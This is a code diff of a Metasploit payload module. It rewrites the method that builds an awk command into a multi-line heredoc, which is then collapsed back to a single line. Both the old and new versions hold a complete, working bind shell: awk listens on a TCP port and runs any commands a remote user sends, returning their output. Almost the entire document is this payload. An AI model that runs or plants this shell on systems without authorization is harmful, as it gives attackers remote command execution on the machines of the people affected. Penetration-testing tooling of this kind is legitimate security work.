@@ -48,6 +48,23 @@ module MetasploitModule
   # Returns the command string to use for execution
   #
   def command_string
-    "awk 'BEGIN{s=\"/inet/tcp/#{datastore['LPORT']}/0/0\";while(1){do{s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!=\"exit\");close(s)}}'"
+    awkcmd = <<~AWK
+      awk 'BEGIN{
+        s=\"/inet/tcp/#{datastore['LPORT']}/0/0\";
+        while(1){
+          do{
+            s|&getline c;
+            if(c){
+              while((c|&getline)>0)print $0|&s;
+              close(c)
+            }
+          }
+          while(c!=\"exit\");
+          close(s)
+        }
+      }'
+    AWK
+    awkcmd.gsub!("\n",'').gsub!('  ', '')
   end
+
 end
